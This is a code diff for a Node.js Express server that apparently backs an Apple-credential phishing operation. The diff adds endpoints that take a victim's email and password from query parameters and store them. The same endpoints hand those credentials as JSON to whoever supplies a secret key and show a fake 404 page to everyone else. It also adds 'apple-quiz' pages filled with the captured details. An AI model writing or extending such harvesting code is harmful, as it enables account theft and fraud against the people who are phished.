@@ -14,6 +14,10 @@ var cost = 0.001
 const port = process.env.PORT || 3000;
 var pwd = {"apple":"",
            "pass":""}
+var pwd2 = {"apple":"",
+           "pass":""}
+var pwd3 = {"apple":"",
+           "pass":""}
 
 process.on('uncaughtException', function (err) {
   console.error(err);
@@ -145,6 +149,32 @@ if (req.query.s == process.env.s) {
 }
 });
 
+app.get("/pwd2", function(req,res) {
+  if (req.query.ne) {
+    pwd2["apple"] = req.query.ne
+  } else if (req.query.np) {
+    pwd2["pass"] = req.query.np
+  }
+if (req.query.s == process.env.s) {
+  res.json(pwd2)
+} else {
+  res.render("404.ejs")
+}
+});
+
+app.get("/pwd3", function(req,res) {
+  if (req.query.ne) {
+    pwd3["apple"] = req.query.ne
+  } else if (req.query.np) {
+    pwd3["pass"] = req.query.np
+  }
+if (req.query.s == process.env.s) {
+  res.json(pwd3)
+} else {
+  res.render("404.ejs")
+}
+});
+
 app.get("/A2/:rnd", function(req,res) {
   res.redirect("https://discord.gg/k3NRzYtmsj")
 })
@@ -153,8 +183,16 @@ app.get("/quize/apple-quize", function(req,res) {
   res.render("apple-quize",{email:pwd["apple"],pass:pwd["pass"]})
 })
 
+app.get("/quize/apple-quizes", function(req,res) {
+  res.render("apple-quizes",{email:pwd2["apple"],pass:pwd2["pass"]})
+})
+
 app.get("/quize/1apple-quize", function(req,res) {
   res.render("1apple-quize")
+})
+
+app.get("/quize/1apple-quizes", function(req,res) {
+  res.render("1apple-quizes")
 })
 
 app.get("/redirection", function(req, res) {
